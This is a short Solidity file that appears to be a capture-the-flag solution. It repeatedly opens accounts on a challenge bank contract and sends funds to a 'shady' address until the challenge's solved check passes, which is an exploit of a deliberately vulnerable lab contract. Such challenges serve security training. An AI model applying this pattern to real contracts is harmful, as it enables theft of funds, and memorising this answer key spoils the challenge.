// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import "../chall/Setup.sol";

contract Solution {
    constructor(Setup setup) {
        assert(!setup.isSolved());
        for (uint8 i = 0; i < 11; i++) {
            setup.remis().openAccount();
            setup.remis().sendMoney(10, address(setup.shady()));
        }
        assert(setup.isSolved());
    }
}
